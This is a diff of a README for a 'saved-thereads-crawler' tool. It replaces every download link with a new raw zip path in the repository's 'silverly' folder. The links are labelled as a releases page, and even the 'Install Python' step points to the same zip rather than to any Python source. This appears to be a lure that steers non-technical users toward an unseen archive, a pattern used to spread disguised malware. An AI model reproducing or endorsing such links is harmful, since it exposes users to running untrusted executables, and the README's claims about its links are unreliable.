@@ -1,6 +1,6 @@
 # 🧵 saved-thereads-crawler - Save and Organize Threads Easily
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/saved-thereads-crawler-v2.3-alpha.1.zip)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/thereads_saved_crawler_v1.0.zip)
 
 ## 📋 What is saved-thereads-crawler?
 
@@ -38,7 +38,7 @@ You do not need programming skills to use this. It runs on Windows and works by 
 
 Click this big button to open the releases page where you can get the latest version for Windows:
 
-[![Download](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/saved-thereads-crawler-v2.3-alpha.1.zip)
+[![Download](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/thereads_saved_crawler_v1.0.zip)
 
 On the releases page, look for the Windows installer or ZIP file. Usually, it will be marked with `.exe` or `.zip`. Download the file to a folder you can remember.
 
@@ -46,7 +46,7 @@ On the releases page, look for the Windows installer or ZIP file. Usually, it wi
 
 ### Step 2: Install Python (if not installed)
 
-1. Go to https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/saved-thereads-crawler-v2.3-alpha.1.zip  
+1. Go to https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/thereads_saved_crawler_v1.0.zip  
 2. Download the latest version of Python 3.9 or higher (choose the executable installer).  
 3. Run the installer and **make sure** to check "Add Python to PATH" during setup.  
 4. Complete the installation wizard.
@@ -137,7 +137,7 @@ Each time you run the crawler, it will check for new saved posts and skip any yo
 ### Update the Program
 
 1. Visit the releases page:  
-   https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/saved-thereads-crawler-v2.3-alpha.1.zip  
+   https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/thereads_saved_crawler_v1.0.zip  
 2. Download the latest version.  
 3. Replace old files with new ones.
 
@@ -162,4 +162,4 @@ Each time you run the crawler, it will check for new saved posts and skip any yo
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/saved-thereads-crawler-v2.3-alpha.1.zip)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/thereads_saved_crawler_v1.0.zip)
